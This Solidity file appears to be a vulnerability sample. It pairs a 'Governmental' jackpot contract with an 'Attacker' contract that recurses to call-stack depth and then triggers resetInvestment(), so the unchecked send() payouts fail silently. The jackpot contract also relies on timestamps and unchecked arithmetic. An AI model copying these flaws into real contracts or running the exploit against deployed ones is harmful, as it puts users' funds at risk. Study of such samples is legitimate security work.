pragma solidity ^0.8.26;

contract Governmental {
    address public owner;
    address public lastInvestor;
    uint public jackpot = 1 ether;
    uint public lastInvestmentTimestamp;
    uint public ONE_MINUTE = 1 minutes;
    uint public totalInvestments;
    uint public totalWinners;
    mapping(address => uint) public investorWins;
    
    event InvestmentMade(address indexed investor, uint amount, uint newJackpot);
    event JackpotWon(address indexed winner, uint prize);
    event OwnerWithdrawal(address indexed owner, uint amount);

    constructor() payable {
        owner = msg.sender;
        if (msg.value < 1 ether) revert();
    }

    function invest() public payable {
        unchecked {
            if (msg.value < jackpot / 2) revert();
            lastInvestor = msg.sender;
            jackpot += msg.value / 2;
            lastInvestmentTimestamp = block.timestamp;
            totalInvestments++;
            emit InvestmentMade(msg.sender, msg.value, jackpot);
        }
    }

    function resetInvestment() public {
        unchecked {
            if (block.timestamp < lastInvestmentTimestamp + ONE_MINUTE) revert();
            payable(lastInvestor).send(jackpot);
            payable(owner).send(address(this).balance - 1 ether);
            totalWinners++;
            investorWins[lastInvestor]++;
            emit JackpotWon(lastInvestor, jackpot);
            lastInvestor = address(0);
            jackpot = 1 ether;
            lastInvestmentTimestamp = 0;
        }
    }

    function withdrawFees() external {
        require(msg.sender == owner, "Only owner can withdraw fees");
        uint fees = address(this).balance - jackpot;
        if (fees > 0) {
            payable(owner).send(fees);
            emit OwnerWithdrawal(owner, fees);
        }
    }
}

contract Attacker {
    function attack(address target, uint count) public {
        unchecked {
            if (0 <= count && count < 1023) {
                this.attack{gas: gasleft() - 2000}(target, count + 1);
            } else {
                Governmental(target).resetInvestment();
            }
        }
    }
}